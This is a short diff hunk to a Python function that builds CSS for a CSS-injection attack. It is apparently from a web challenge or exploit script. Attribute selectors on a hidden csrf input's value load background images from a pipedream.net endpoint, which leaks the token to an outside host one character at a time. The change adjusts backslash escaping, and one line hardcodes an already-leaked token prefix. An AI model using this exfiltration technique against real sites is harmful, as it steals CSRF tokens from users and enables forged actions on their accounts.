@@ -74,7 +74,7 @@ def build_css(chars):
         input[name="csrf"][value^="'''+chars+'''Y"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''Y);}
         input[name="csrf"][value^="'''+chars+'''Z"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''Z);}
         input[name="csrf"][value^="'''+chars+'''["]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''%27);}
-        input[name="csrf"][value^="'''+chars+''''''+bytearray.fromhex("5C").decode()+'''\"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''%28);}
+        input[name="csrf"][value^="'''+chars+''''''+bytearray.fromhex("5C").decode()+bytearray.fromhex("5C").decode()+'''"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''%28);}
         input[name="csrf"][value^="'''+chars+''']"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''%29);}
         input[name="csrf"][value^="'''+chars+'''^"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''^);}
         input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC_"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC_);}
